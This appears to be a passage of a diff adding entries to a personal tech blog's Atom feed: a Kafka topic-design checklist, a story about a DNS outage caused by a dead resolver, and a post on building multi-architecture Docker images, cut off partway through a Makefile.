+Is there an option to make use of &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.conduktor.io&#x2F;kafka&#x2F;kafka-message-compression&#x2F;&quot;&gt;message compression&lt;&#x2F;a&gt;?&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;strimzi.io&#x2F;blog&#x2F;2021&#x2F;12&#x2F;17&#x2F;kafka-segment-retention&#x2F;&quot;&gt;&lt;strong&gt;Data retention policy&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;:
+How long do you need to keep data? → Consider the business and data protection requirements of
+a product you are developing, and the cost of storing data.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Message sending guarantees (&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.conduktor.io&#x2F;kafka&#x2F;kafka-producer-acks-deep-dive&#x2F;&quot;&gt;Acks&lt;&#x2F;a&gt;)&lt;&#x2F;strong&gt; →
+Finding the right balance between latency and reliability within replication (durability).&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Message delivery guarantees&lt;&#x2F;strong&gt; → How critical is message loss or duplication of messages to
+the business objective? Are &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.conduktor.io&#x2F;kafka&#x2F;idempotent-kafka-producer&#x2F;&quot;&gt;idempotency&lt;&#x2F;a&gt;
+and &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.confluent.io&#x2F;blog&#x2F;transactions-apache-kafka&#x2F;&quot;&gt;transactionality&lt;&#x2F;a&gt; needed?&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;What &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;redpanda.com&#x2F;guides&#x2F;kafka-tutorial&#x2F;kafka-partition-strategy&quot;&gt;partitioning strategy&lt;&#x2F;a&gt; will producers use?&lt;&#x2F;strong&gt; →
+Is the default strategy (&lt;code&gt;Default partitioner&lt;&#x2F;code&gt;) appropriate?&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;For a particular topic, is it important to store the entire message log, or are the latest
+changes sufficient → Consider using &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;docs.aiven.io&#x2F;docs&#x2F;products&#x2F;kafka&#x2F;concepts&#x2F;log-compaction&quot;&gt;&lt;strong&gt;Compacted&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;
+&lt;strong&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;docs.confluent.io&#x2F;kafka&#x2F;design&#x2F;log_compaction.html&quot;&gt;topics&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Do the created topics require a &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.conduktor.io&#x2F;kafka&#x2F;kafka-consumer-groups-and-consumer-offsets&#x2F;&quot;&gt;consumer group&lt;&#x2F;a&gt;?&lt;&#x2F;strong&gt; →
+How do you plan to scale consumers and their bandwidth? What happens when the group is
+&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.verica.io&#x2F;blog&#x2F;understanding-kafkas-consumer-group-rebalancing&#x2F;&quot;&gt;rebalanced&lt;&#x2F;a&gt;?&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;That&#x27;s it. The checklist&#x2F;questionnaire is by no means exhaustive and it only covers the essentials.
+It leaves out a lot of things such as data encryption, authentication, authorization, and cluster
+configuration – assuming that the SRE team or some PAAS will take care of that for you.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>My &quot;It&#x27;s not DNS&quot; story</title>
+        <published>2023-08-12T00:00:00+00:00</published>
+        <updated>2023-08-12T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/it-is-not-dns/" type="text/html"/>
+        <id>https://akrisanov.com/it-is-not-dns/</id>
+        
+        <content type="html">&lt;p&gt;Summer of 2019. I&#x27;m joining a large retail organization that is undergoing a digital transformation.
+The role I&#x27;ve been hired for is a technical leadership role. The project I&#x27;m taking over doesn&#x27;t
+even have a complete team yet, which means I&#x27;ll be wearing all sorts of hats until I hire someone
+and delegate work. You could say, I&#x27;m the only &amp;quot;developer&amp;quot; on the team. Also, the code base is
+already serving users, and the services are part of a lead generation funnel for one of the grocery
+networks. So if something goes down, the company loses potential customers and revenue. The fact
+that the project was developed by an outsourced team that has already left without handing over
+proper documentation makes things more complicated and fragile.&lt;&#x2F;p&gt;
+&lt;p&gt;In a few days, I try to understand how the services are run in production, write missing README
+and system design papers, and create initial tasks for maintenance. All goes well, and I manage
+to deploy some changes to the backend. It&#x27;s Friday afternoon, so I still have time to do
+a rollback if I&#x27;ve made a mistake. But nothing suspicious has been observed during the day,
+and I leave the office for the weekend.&lt;&#x2F;p&gt;
+&lt;p&gt;The fun begins on Sunday. Because I&#x27;m in charge of the project, I&#x27;m the one who is on-call.
+I get a call from our support team telling me that the web application isn&#x27;t responding from time
+to time and that they&#x27;re getting complaints from customers.&lt;&#x2F;p&gt;
+&lt;p&gt;The first thing I do is open my browser to check what users are seeing. Surprisingly, a web page
+loads just fine. I hit refresh – same result. Then I turn off Wi-Fi on my iPhone and open
+Safari – 504 error. It&#x27;s a Nginx page. Now it is something.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;karusel-arch.jpg&quot; alt=&quot;Simplified diagram of the project architecture&quot; &#x2F;&gt;
+&lt;span class=&quot;img-title&quot;&gt;Simplified diagram of the project architecture&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;I open the monitoring and observe no high load. CPU usage is low, more than 50% of memory is free,
+plenty of free disk space on each of the virtual machines, no spikes in the network bandwidth.
+Looking at the Nginx logs only proves that there&#x27;s a gateway timeout error related to the backend.
+I should check the application backend logs. Nothing there, no errors at all.&lt;&#x2F;p&gt;
+&lt;p&gt;At this point, I start to blame the network and call the network infrastructure team.
+These guys work on an organisational level and potentially can see what I can&#x27;t. After spending
+an hour investigating together, we see nothing. It&#x27;s already Sunday evening, and
+I&#x27;m almost hopeless.&lt;&#x2F;p&gt;
+&lt;p&gt;I decide to take a break and go for a walk. When I&#x27;m back, I try to ssh to a VM again. Suddenly,
+I notice a few seconds of delay before I can type my commands into a terminal. &amp;quot;It can&#x27;t be DNS&amp;quot;,
+I say to myself. To prove it, I ping a public domain from our network. Again, a few seconds of
+delay and the network packets are flying without a hitch.
+&amp;quot;If DNS was down, the infrastructure team would notice.&amp;quot;, I continue to reason.
+Before escalating the situation further to upper management, I choose to check the DNS
+configuration on the backend virtual machines.&lt;&#x2F;p&gt;
+&lt;p&gt;The &#x2F;etc&#x2F;resolv.conf is a DNS resolver configuration file. It contains records in the following format:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;nameserver &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;ip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;nameserver &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;ip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In my developer&#x27;s mind, a Linux machine receives these records at boot time and caches them.
+This file is then queried to resolve domains. What could possibly go wrong? Well, I ask the
+infrastructure team about the IP addresses I see in &lt;code&gt;&#x2F;etc&#x2F;resolv.conf&lt;&#x2F;code&gt; and get a surprising
+answer: &amp;quot;The IP addresses are DNS load balancers and the first one in the list is currently down&amp;quot;.
+Hearing this, I begin to understand why the ssh and initial ping delays are happening.
+The first DNS load balancer is queried, but because it&#x27;s down, it doesn&#x27;t respond, and
+the resolution continues with the second IP address.&lt;&#x2F;p&gt;
+&lt;p&gt;I remove the first nameserver from &lt;code&gt;&#x2F;etc&#x2F;resolv.conf&lt;&#x2F;code&gt; and drop the DNS cache on each of the VMs.
+After a few seconds, the 504 error and the gateway timeout disappear. In the morning, we&#x27;ll
+discuss the incident with the infrastructure team and senior management. Fun week ahead.&lt;&#x2F;p&gt;
+&lt;div class=&quot;callout callout-bdc&quot;&gt;
+&lt;p&gt;
+    It&#x27;s not DNS&lt;br&#x2F;&gt;
+    There&#x27;s no way it&#x27;s DNS&lt;br&#x2F;&gt;
+    It was DNS
+&lt;&#x2F;p&gt;
+&lt;p class=&quot;author&quot;&gt;Old Japanese Haiku&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Building Multi-Arch Images for Arm and x86</title>
+        <published>2023-08-10T00:00:00+00:00</published>
+        <updated>2023-08-10T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/multi-arch-docker-images/" type="text/html"/>
+        <id>https://akrisanov.com/multi-arch-docker-images/</id>
+        
+        <content type="html">&lt;p&gt;At work, I am involved in the development of a machine learning SDK and cloud services for
+privacy and data protection. Like almost every company in this space, we rely heavily on
+Python&#x27;s scientific ecosystem. Because it&#x27;s quite mature and depends on native library
+development that started years ago, getting these packages to work on new architectures
+can be tedious.&lt;&#x2F;p&gt;
+&lt;p&gt;I am one of the few developers on our team who has stuck with MacOS and have a Macbook Pro
+with M1 chip. There is no easy way for me to bootstrap our development environment in a matter
+of minutes. I have to use Conda, install specific versions of Python packages, patch some native
+libraries, and even create a symlink from an OS-specific package to its generic name
+(I&#x27;m talking to you, Tensorflow). People on the &lt;code&gt;x86_64&lt;&#x2F;code&gt; architecture generally won&#x27;t have
+this problem – almost every package we use comes with a pre-built wheel for a chosen OS.
+Moreover, to install the SDK as a dependency of, say, an HTTP API service, I had to assemble
+it from sources: &lt;code&gt;pip install -e &#x27;.&#x27;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;A few months ago we didn&#x27;t even support the Arm64 architecture at a build level. This changed when
+I introduced a Github Action pipeline to build Python wheels for Linux &lt;code&gt;x86_64&lt;&#x2F;code&gt;, &lt;code&gt;aarch64&lt;&#x2F;code&gt;, and &lt;code&gt;universal&lt;&#x2F;code&gt;.
+Instead of manually compiling some native libraries on my machine, I moved the work to GitHub and
+its Linux instances. From that moment on, I could just get the package from a private PyPI registry.
+The sad truth is that I still use Conda and sometimes patch one or two transitive dependencies for
+my M1 chip. But other than that, no hard times to date.&lt;&#x2F;p&gt;
+&lt;p&gt;Today I needed to distribute a newly created API service with the SDK inside as a Docker image.
+And I haven&#x27;t found an easy way to define a Dockerfile that can be built and run on
+Apple Silicon without Conda:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;Dockerfile&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-Dockerfile &quot;&gt;&lt;code class=&quot;language-Dockerfile&quot; data-lang=&quot;Dockerfile&quot;&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span&gt; python:3.9-slim-buster &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;AS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;base
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENV &lt;&#x2F;span&gt;&lt;span&gt;PYTHONDONTWRITEBYTECODE=1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENV &lt;&#x2F;span&gt;&lt;span&gt;PYTHONUNBUFFERED=1
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Install Conda
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt-get update &amp;amp;&amp;amp; apt-get -y upgrade
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt-get install -y --no-install-recommends build-essential g++ gcc libssl-dev cmake git wget
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENV &lt;&#x2F;span&gt;&lt;span&gt;PATH=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;&#x2F;root&#x2F;miniconda3&#x2F;bin:${PATH}&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ARG &lt;&#x2F;span&gt;&lt;span&gt;PATH=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;&#x2F;root&#x2F;miniconda3&#x2F;bin:${PATH}&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;wget \
+&lt;&#x2F;span&gt;&lt;span&gt;    https:&#x2F;&#x2F;repo.anaconda.com&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-aarch64.sh \
+&lt;&#x2F;span&gt;&lt;span&gt;    &amp;amp;&amp;amp; mkdir &#x2F;root&#x2F;.conda \
+&lt;&#x2F;span&gt;&lt;span&gt;    &amp;amp;&amp;amp; bash Miniconda3-latest-Linux-aarch64.sh -b \
+&lt;&#x2F;span&gt;&lt;span&gt;    &amp;amp;&amp;amp; rm -f Miniconda3-latest-Linux-aarch64.sh
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Create a Conda environment and install native dependencies
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;--mount=type=cache,target=&#x2F;root&#x2F;.cache \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda init bash &amp;amp;&amp;amp; . &#x2F;root&#x2F;.bashrc &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda update conda &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda create -n de_agent python=3.9 &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda env config vars set -n de_agent LD_PRELOAD=&#x2F;usr&#x2F;lib&#x2F;aarch64-linux-gnu&#x2F;libgomp.so.1 &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda activate de_agent &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    conda install gdal llvmdev dm-tree -y &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    pip install --upgrade pip setuptools wheel &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    pip install h3
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Copy application files
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;WORKDIR &lt;&#x2F;span&gt;&lt;span&gt;&#x2F;app
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; app&#x2F; .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; logging.yaml .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; main.py .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; requirements.txt .&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Install Python packages
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ARG &lt;&#x2F;span&gt;&lt;span&gt;DE_AGENT_PYPI_TOKEN
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;--mount=type=cache,target=&#x2F;root&#x2F;.cache \
+&lt;&#x2F;span&gt;&lt;span&gt;    . &#x2F;root&#x2F;.bashrc &amp;amp;&amp;amp; conda activate de_agent &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    pip install -r requirements.txt --extra-index-url=https:&#x2F;&#x2F;${DE_AGENT_PYPI_TOKEN}:@pypi.****.ai&#x2F;pypi&#x2F; &amp;amp;&amp;amp; \
+&lt;&#x2F;span&gt;&lt;span&gt;    pip install numpy==1.23.5
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Cleanup
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt -qy purge --auto-remove build-essential g++ gcc libssl-dev cmake git wget
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt autoremove &amp;amp;&amp;amp; apt clean
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Create a user
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;groupadd -r de_agent &amp;amp;&amp;amp; useradd -r -m -g de_agent de_agent
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;chown -R de_agent:de_agent &#x2F;app
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;USER &lt;&#x2F;span&gt;&lt;span&gt;de_agent
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Run the web application
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;EXPOSE &lt;&#x2F;span&gt;&lt;span&gt;8000
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENTRYPOINT &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;PYTHONPATH=.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;python&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;main.py&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;As you can see, the manifest is quite verbose. It also adds the Conda binaries and related
+files to a release image. It is a price that must be paid.&lt;&#x2F;p&gt;
+&lt;p&gt;Fortunately, for Linux, we don&#x27;t need all of this machinery:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;Dockerfile&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-Dockerfile &quot;&gt;&lt;code class=&quot;language-Dockerfile&quot; data-lang=&quot;Dockerfile&quot;&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span&gt; python:3.9-slim-buster &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;AS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;base
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENV &lt;&#x2F;span&gt;&lt;span&gt;PYTHONDONTWRITEBYTECODE=1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENV &lt;&#x2F;span&gt;&lt;span&gt;PYTHONUNBUFFERED=1
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Install system packages
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt-get update &amp;amp;&amp;amp; apt-get -y upgrade
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt-get install -y --no-install-recommends build-essential g++ gcc libssl-dev cmake git wget
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Copy application files
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;WORKDIR &lt;&#x2F;span&gt;&lt;span&gt;&#x2F;app
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; app&#x2F; .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; logging.yaml .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; main.py .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;COPY&lt;&#x2F;span&gt;&lt;span&gt; requirements.txt .&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Install Python dependencies
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ARG &lt;&#x2F;span&gt;&lt;span&gt;DE_AGENT_PYPI_TOKEN
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;--mount=type=cache,target=&#x2F;root&#x2F;.cache \
+&lt;&#x2F;span&gt;&lt;span&gt;    pip install -r requirements.txt --extra-index-url=https:&#x2F;&#x2F;${DE_AGENT_PYPI_TOKEN}:@pypi.****.ai&#x2F;pypi&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Cleanup
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt -qy purge --auto-remove build-essential g++ gcc libssl-dev cmake git wget
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;apt autoremove &amp;amp;&amp;amp; apt clean
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Create a user
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;groupadd -r de_agent &amp;amp;&amp;amp; useradd -r -m -g de_agent de_agent
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;RUN &lt;&#x2F;span&gt;&lt;span&gt;chown -R de_agent:de_agent &#x2F;app
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;USER &lt;&#x2F;span&gt;&lt;span&gt;de_agent
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Run the web application
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;EXPOSE &lt;&#x2F;span&gt;&lt;span&gt;8000
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;ENTRYPOINT &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;PYTHONPATH=.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;python&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;main.py&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The question now is how to build Docker images for both architectures on a Mac.
+This is where Docker comes in. Docker Desktop officially supports &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.docker.com&#x2F;blog&#x2F;multi-arch-images&#x2F;&quot;&gt;building multi-arch images
+for Arm and x86&lt;&#x2F;a&gt;. Learning this, I was able to
+add a few targets to my Makefile to quickly build images:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;Makefile&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-Makefile &quot;&gt;&lt;code class=&quot;language-Makefile&quot; data-lang=&quot;Makefile&quot;&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;build&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a7c81;&quot;&gt;# Build a Docker image for x86_64
